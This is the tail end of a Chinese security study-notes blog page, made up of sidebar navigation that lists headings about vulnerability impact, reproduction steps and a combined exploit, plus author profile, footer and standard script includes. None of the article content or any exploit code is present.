href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-5"><span class="nav-number">10.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B-4"><span class="nav-number">10.3.</span> <span class="nav-text">复现流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8EXP"><span class="nav-number"></span> <span class="nav-text">综合利用EXP</span></a></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="李钰璕"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">李钰璕</p>
  <div class="site-description" itemprop="description">安全学习笔记</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">89</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">115</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        <!--

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">李钰璕</span>
</div>
-->

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = 'true';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
